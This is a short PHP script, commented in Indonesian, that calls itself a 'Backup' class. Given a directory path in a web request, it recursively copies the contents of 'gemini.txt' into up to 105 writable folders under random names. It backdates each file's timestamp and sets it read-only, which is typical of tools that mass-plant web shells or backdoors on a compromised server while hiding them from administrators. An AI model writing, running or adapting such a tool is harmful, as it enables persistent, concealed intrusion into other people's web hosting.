<?php
// Shidqi
class Backup {
    private $uploadCount = 0;
    private $maxUploads = 105;

    function get_random_filename($filenameListPath = "names.txt") {
    
        if (file_exists($filenameListPath)) {
            $filenames = file($filenameListPath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            if (!empty($filenames)) {
                // Ambil nama file secara acak dari daftar
                return $filenames[array_rand($filenames)];
            } else {
                echo "Daftar nama file kosong.<br>";
                return null;
            }
        } else {
            echo "File 'names.txt' tidak ditemukan.<br>";
            return null;
        }
    }

    function recursive_directory($dir) {
        $tree = glob(rtrim($dir, '/') . '/*');
        $isDirectory = false;

        foreach ($tree as $sc) {
            if ($this->uploadCount >= $this->maxUploads) {
                break;
            }

            if (is_dir($sc)) {
                $isDirectory = true;
                $this->recursive_directory($sc);
            }
        }
        if (!$isDirectory && is_writable($dir) && $this->uploadCount < $this->maxUploads) {
       
            $random_name = $this->get_random_filename();

            if ($random_name) {
                
                $contentFilePath = "gemini.txt";
                if (file_exists($contentFilePath)) {
                    $content = file_get_contents($contentFilePath);
                    file_put_contents($dir . "/" . $random_name, $content);
                    
 
                    touch($dir . "/" . $random_name, strtotime('2024-04-15 00:00:00'));
                    
        
                    chmod($dir . "/" . $random_name, 0444);
                    echo $dir . "/" . $random_name . "<br>";
                    $this->uploadCount++;
                } else {
                    echo "File 'gemini.txt' tidak ditemukan.<br>";
                }
            }
        }
    }
}

if (isset($_GET['path'])) {
    $path = filter_input(INPUT_GET, 'path', FILTER_SANITIZE_STRING);

    if ($path && is_dir($path)) {
        $instance = new Backup();
        $instance->recursive_directory($path);
    } else {
        echo "Path tidak valid atau tidak ditemukan.<br>";
    }
} else {
    echo "Path tidak diset.<br>";
}

?>